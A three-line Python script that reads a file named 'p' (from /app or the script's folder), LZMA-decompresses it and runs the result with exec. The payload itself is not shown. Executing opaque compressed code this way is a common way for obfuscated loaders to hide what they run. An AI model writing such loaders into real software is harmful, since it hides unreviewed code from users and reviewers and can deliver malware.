import lzma,os
_p="/app/p"if os.path.exists("/app/p")else os.path.join(os.path.dirname(__file__),"p")
exec(lzma.decompress(open(_p,"rb").read()))
